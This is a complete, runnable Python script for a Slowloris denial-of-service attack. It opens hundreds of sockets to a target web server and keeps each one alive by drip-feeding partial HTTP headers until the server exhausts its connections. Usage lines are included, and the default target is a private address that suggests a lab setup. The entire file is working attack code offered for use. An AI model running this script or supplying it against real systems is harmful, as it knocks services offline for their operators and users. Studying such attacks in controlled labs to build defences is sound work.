#!/usr/bin/env python3
"""DoS Layer 3 - Slowloris (connection exhaustion).

Open many sockets to the target and drip-feed HTTP headers slowly so the
server keeps every connection alive until it runs out of sockets/threads.
Pure stdlib, no extra packages.

Usage:
    python3 slowloris.py [base_url] [connections]
    python3 slowloris.py http://192.168.56.1:3000 300
"""
import socket
import sys
import threading
import time
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.56.1:3000"
CONN = int(sys.argv[2]) if len(sys.argv) > 2 else 300

url = urllib.parse.urlparse(BASE)
host = url.hostname or "192.168.56.1"
port = url.port or 80

stop = False
sockets = []


def keeper(sock):
    global stop
    try:
        while not stop:
            sock.sendall(b"X-keepalive: deadbeef\r\n")
            time.sleep(10)
    except Exception:
        pass


print("[start] opening %d slow connections to %s:%d" % (CONN, host, port))
for i in range(CONN):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n" % host.encode())
        sockets.append((s, threading.Thread(target=keeper, args=(s,), daemon=True)))
        if i % 50 == 0:
            print("  ...%d held" % len(sockets))
    except Exception as e:
        err = str(e).strip()
        if err:
            print("  [%d] connect failed: %s" % (i, err))
        break

for _, t in sockets:
    t.start()
print("[open] %d sockets held. Ctrl+C to release." % len(sockets))

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    stop = True
    for s, _ in sockets:
        try:
            s.close()
        except Exception:
            pass
    print("[stop] released all connections")